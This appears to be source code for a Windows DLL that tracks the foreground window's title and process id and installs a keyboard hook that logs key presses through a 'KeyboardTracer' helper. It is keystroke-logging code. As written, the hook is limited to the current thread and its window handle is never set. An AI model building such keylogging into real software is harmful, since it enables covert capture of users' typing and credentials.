#include "pch.h"
#include "Pell.h"
#include "window_manager.h"
#include "keyboard_tracer.h"

HWND hWnd = NULL;
HHOOK hHook = NULL;
WindowManager* window_manager;
KeyboardTracer* tracer;

#pragma region Export DLL 
extern "C" __declspec(dllexport) void init()
{
	initialize();
}

extern "C" __declspec(dllexport) void exit_key_log_info()
{
	delete window_manager;
}

extern "C" __declspec(dllexport) void print_win_title()
{
	window_manager->PrintWinTitle();
}

extern "C" __declspec(dllexport) void my_get_foreground_window()
{
	char buf[100];
	HWND hWnd;
	hWnd = GetForegroundWindow();
	GetWindowTextA(hWnd, buf, 100);
	window_manager->SetWinTitle(buf);
	window_manager->SetWindowHandle(hWnd);
}

extern "C" __declspec(dllexport) void my_set_process_id()
{
	HWND h = window_manager->GetWindowHandle();
	DWORD id;
	GetWindowThreadProcessId(h, &id);
	window_manager->SetProcessId(id);
}

extern "C" __declspec(dllexport) DWORD get_process_id()
{
	return window_manager->GetProcessId();
}

extern "C" __declspec(dllexport) char* get_win_title()
{
	return window_manager->GetWinTitle();
}

extern "C" __declspec(dllexport) void start_hook()
{
	StartHook();
}

extern "C" __declspec(dllexport) void end_hook()
{
	EndHook();
}
#pragma endregion


void initialize()
{
	window_manager = new WindowManager();
	tracer = new KeyboardTracer();
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}

	tracer->setLpBinary(lParam);

	if (tracer->getLpBinary(0) == 1)
	{
		tracer->registKeyLog(wParam);
		tracer->print_log();
	}
	return TRUE;
}

void StartHook()
{
	if (hWnd == NULL)
	{
		std::cout << "[!!!] window handle is null. fail to start hook.s" << std::endl;
		return;
	}
	HINSTANCE hInst;
	hInst = (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE);
	hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, GetCurrentThreadId());
	if (hHook == NULL)
	{
		std::cout << "[!!!] hook is null. fail to start hook.s" << std::endl;
		return;
	}
	else
	{
		std::cout << "[*] successfull, start hook." << std::endl;
		return;
	}
}

bool EndHook()
{
	return UnhookWindowsHookEx(hHook);
}


